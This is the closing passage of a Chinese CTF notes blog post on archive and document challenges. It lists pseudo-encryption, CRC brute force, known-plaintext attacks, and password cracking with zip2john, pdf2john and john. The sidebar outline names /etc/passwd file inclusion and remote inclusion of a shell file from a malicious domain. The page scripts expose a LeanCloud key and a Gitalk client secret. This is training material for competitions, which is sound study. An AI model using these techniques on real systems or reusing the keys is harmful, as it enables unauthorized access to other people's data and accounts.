+<h2 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h2><h3 id="1-伪加密"><a href="#1-伪加密" class="headerlink" title="1.伪加密"></a>1.伪加密</h3><h3 id="2-密码爆破"><a href="#2-密码爆破" class="headerlink" title="2.密码爆破"></a>2.密码爆破</h3><ul>
+<li>a.ARCHPR进行密码爆破</li>
+<li>b.zip2john &gt;1.hash   john  1.hash</li>
+<li>c.rar2john</li>
+</ul>
+<h3 id="3-CRC爆破"><a href="#3-CRC爆破" class="headerlink" title="3.CRC爆破"></a>3.CRC爆破</h3><h3 id="4-明文攻击"><a href="#4-明文攻击" class="headerlink" title="4.明文攻击"></a>4.明文攻击</h3><h3 id="5-随波逐流都有"><a href="#5-随波逐流都有" class="headerlink" title="5.随波逐流都有"></a>5.随波逐流都有</h3><h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><h3 id="1-word"><a href="#1-word" class="headerlink" title="1.word"></a>1.word</h3><ul>
+<li>a.改为压缩包，从中查找隐藏信息</li>
+<li>b.宏编程，vbs</li>
+<li>c.脚本文件可能自带密码，找一些在线的word密码解密工具</li>
+<li>d.vbs工程解密工具</li>
+</ul>
+<h3 id="2-excel"><a href="#2-excel" class="headerlink" title="2.excel"></a>2.excel</h3><ul>
+<li>a.excel有加密，找在线解密</li>
+</ul>
+<h3 id="3-pdf"><a href="#3-pdf" class="headerlink" title="3.pdf"></a>3.pdf</h3><ul>
+<li>a.pdf2john &gt; 1.hash   john pdf.hash</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>我是阿星，阿星的阿，阿星的星！</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/WechatPay.png" alt="无星 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/AliPay.png" alt="无星 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/06/08/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94PlayWright%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6/" rel="prev" title="无星的自动化之旅（七）——PlayWright加载插件">
+      <i class="fa fa-chevron-left"></i> 无星的自动化之旅（七）——PlayWright加载插件
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/06/30/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E5%8D%81%EF%BC%89%E2%80%94%E2%80%94PHP/" rel="next" title="无星的安全之旅（十）——PHP">
+      无星的安全之旅（十）——PHP <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E3%80%81%E7%88%86%E7%A0%B4%E3%80%81%E8%AE%A4%E8%AF%81"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集、爆破、认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.敏感文件泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-dirsearch-dirb"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.dirsearch\dirb\</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-BURP"><span class="nav-number">1.1.3.</span> <span class="nav-text">3.BURP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%88%90%E5%9B%A0"><span class="nav-number">2.0.1.</span> <span class="nav-text">1.成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%86%E9%9A%94%E7%AC%A6"><span class="nav-number">2.0.2.</span> <span class="nav-text">2.分隔符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-number">2.0.3.</span> <span class="nav-text">3.读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="nav-number">2.0.4.</span> <span class="nav-text">4.绕过过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="nav-number">2.0.5.</span> <span class="nav-text">5.空格过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="nav-number">2.0.6.</span> <span class="nav-text">6.无回显</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">3.</span> <span class="nav-text">代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8E%9F%E5%9B%A0"><span class="nav-number">3.0.1.</span> <span class="nav-text">1.原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8"><span class="nav-number">3.0.2.</span> <span class="nav-text">2.利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%B8%80%E4%BA%9B%E8%BF%87%E6%BB%A4"><span class="nav-number">3.0.3.</span> <span class="nav-text">3.一些过滤</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">4.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-etc-passwd-etc-mysql-my-cnf-%E3%80%90%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E3%80%91"><span class="nav-number">4.0.1.</span> <span class="nav-text">1.本地文件包含   &#x2F;etc&#x2F;passwd     &#x2F;etc&#x2F;mysql&#x2F;my.cnf   【读取配置文件查看服务配置信息】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-http-%E6%81%B6%E6%84%8F%E5%9F%9F%E5%90%8D-shell-txt-%E3%80%90%E5%8C%85%E5%90%AB%E8%BF%9C%E7%A8%8B%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E3%80%91"><span class="nav-number">4.0.2.</span> <span class="nav-text">2.远程文件包含    http:&#x2F;&#x2F;恶意域名&#x2F;shell.txt     【包含远程恶意文件】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">4.0.3.</span> <span class="nav-text">3.伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-SESSION%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">4.0.4.</span> <span class="nav-text">4.SESSION文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-PHP7-segment-fault"><span class="nav-number">4.0.5.</span> <span class="nav-text">5.PHP7 segment fault</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="nav-number">4.0.6.</span> <span class="nav-text">6.日志包含</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.</span> <span class="nav-text">反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.0.1.</span> <span class="nav-text">1.序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.0.2.</span> <span class="nav-text">2.反序列化</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">6.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%8F%E6%B3%A2%E9%80%90%E6%B5%81"><span class="nav-number">6.0.1.</span> <span class="nav-text">随波逐流</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81"><span class="nav-number">6.0.2.</span> <span class="nav-text">编码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%BE%E7%89%87"><span class="nav-number">6.1.</span> <span class="nav-text">图片</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-jpg"><span class="nav-number">6.1.1.</span> <span class="nav-text">1.jpg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-png"><span class="nav-number">6.1.2.</span> <span class="nav-text">2.png</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-gif"><span class="nav-number">6.1.3.</span> <span class="nav-text">3.gif</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7"><span class="nav-number">6.1.4.</span> <span class="nav-text">4.其他工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9F%B3%E9%A2%91"><span class="nav-number">6.2.</span> <span class="nav-text">音频</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-audacity"><span class="nav-number">6.2.1.</span> <span class="nav-text">1.audacity</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%86%E9%A2%91"><span class="nav-number">6.3.</span> <span class="nav-text">视频</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-potplayer"><span class="nav-number">6.3.1.</span> <span class="nav-text">1.potplayer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%85%B6%E4%BB%96"><span class="nav-number">6.3.2.</span> <span class="nav-text">2.其他</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="nav-number">6.4.</span> <span class="nav-text">压缩包</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BC%AA%E5%8A%A0%E5%AF%86"><span class="nav-number">6.4.1.</span> <span class="nav-text">1.伪加密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="nav-number">6.4.2.</span> <span class="nav-text">2.密码爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-CRC%E7%88%86%E7%A0%B4"><span class="nav-number">6.4.3.</span> <span class="nav-text">3.CRC爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB"><span class="nav-number">6.4.4.</span> <span class="nav-text">4.明文攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E9%9A%8F%E6%B3%A2%E9%80%90%E6%B5%81%E9%83%BD%E6%9C%89"><span class="nav-number">6.4.5.</span> <span class="nav-text">5.随波逐流都有</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E6%A1%A3"><span class="nav-number">6.5.</span> <span class="nav-text">文档</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-word"><span class="nav-number">6.5.1.</span> <span class="nav-text">1.word</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-excel"><span class="nav-number">6.5.2.</span> <span class="nav-text">2.excel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-pdf"><span class="nav-number">6.5.3.</span> <span class="nav-text">3.pdf</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="无星"
+      src="/images/headerPic.png">
+  <p class="site-author-name" itemprop="name">无星</p>
+  <div class="site-description" itemprop="description">一个么的前途的弟中弟</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/XingXiaoWu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;XingXiaoWu" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/fef7696741c8" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;fef7696741c8" rel="noopener" target="_blank"><i class="fa fa-link fa-fw"></i>简书</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://juejin.cn/user/1503787636493886" title="掘金 → https:&#x2F;&#x2F;juejin.cn&#x2F;user&#x2F;1503787636493886" rel="noopener" target="_blank"><i class="fa fa-link fa-fw"></i>掘金</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.huan666.de/" title="https:&#x2F;&#x2F;blog.huan666.de&#x2F;" rel="noopener" target="_blank">焕昭君</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://aiiko.club/" title="https:&#x2F;&#x2F;aiiko.club" rel="noopener" target="_blank">爱喵日记</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.mikuchan.top/?ref=xingxiaowu.cn" title="https:&#x2F;&#x2F;www.mikuchan.top?ref&#x3D;xingxiaowu.cn" rel="noopener" target="_blank">团子的航海日志</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://dazhuang.store/webp/" title="https:&#x2F;&#x2F;dazhuang.store&#x2F;webp&#x2F;" rel="noopener" target="_blank">大壮</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.webshell.cc/" title="https:&#x2F;&#x2F;www.webshell.cc&#x2F;" rel="noopener" target="_blank">WebShell'S Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.fanjunyang.zone/" title="https:&#x2F;&#x2F;blog.fanjunyang.zone&#x2F;" rel="noopener" target="_blank">俊阳的IT主页</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.sqlsec.com/" title="https:&#x2F;&#x2F;www.sqlsec.com&#x2F;" rel="noopener" target="_blank">国光</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://xiaoqiuxx.xyz/" title="http:&#x2F;&#x2F;xiaoqiuxx.xyz&#x2F;" rel="noopener" target="_blank">xiaoqiuxx's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.hyhforever.top/" title="https:&#x2F;&#x2F;www.hyhforever.top&#x2F;" rel="noopener" target="_blank">HYH's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.v2rayfree.eu.org/" title="https:&#x2F;&#x2F;www.v2rayfree.eu.org&#x2F;" rel="noopener" target="_blank">应急链接</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">无星</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">1.3m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">19:22</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+<a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank" style="display:flex;flex-direction: row;align-items: center;justify-content: center; border:none; color: #999;">
+  由
+  <img src="/images/upaiyun/logo.png"/ style="width:80px;margin:0;">
+  提供CDN加速/云存储服务
+</a>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              Counter('post', '/classes/Counter', { title, url, time: 1 })
+                .then(response => response.json())
+                .then(() => {
+                  leancloudSelector(url).innerText = 1;
+                })
+                .catch(error => {
+                  console.error('Failed to create', error);
+                });
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"pnwsxTh3sKr3Lb0RG3KCrFxX-gzGzoHsz","app_key":"CKxxpzPHaBUuiudduqDrkBUk","server_url":null,"security":false};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'c06f519d5671dfd10942',
+      clientSecret: '38d97414c2b8bfec7f473f9f3458ca58fd0d25d1',
+      repo        : 'XingXiaoWu.github.io',
+      owner       : 'XingXiaoWu',
+      admin       : ['XingXiaoWu'],
+      id          : '7983cd74c6d25058fd4c32eda97b11cd',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+  <style>
+    #forkongithub a{
+      background:#000;color:#fff;
+      text-decoration:none;font-family:arial,sans-serif;
+      text-align:center;font-weight:bold;padding:5px 40px;
+      font-size:1rem;line-height:2rem;position:relative;transition:0.5s;
+    }
+    #forkongithub a:hover{background:#c11;color:#fff;}
+    #forkongithub a::before,#forkongithub a::after{content:"";width:100%;display:block;position:absolute;top:1px;left:0;height:1px;background:#fff;}
+    #forkongithub a::after{bottom:1px;top:auto;}
+    @media screen and (min-width:800px){
+      #forkongithub{position:fixed;display:block;top:0;right:0;width:200px;overflow:hidden;height:200px;z-index:9999;
+    }
+    #forkongithub a{
+      width:200px;
+      position:absolute;top:60px;right:-60px;
+      transform:rotate(45deg);-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);-moz-transform:rotate(45deg);-o-transform:rotate(45deg);
+      box-shadow:4px 4px 10px rgba(0,0,0,0.8);
+    }
+  </style>
+</body>
+</html>
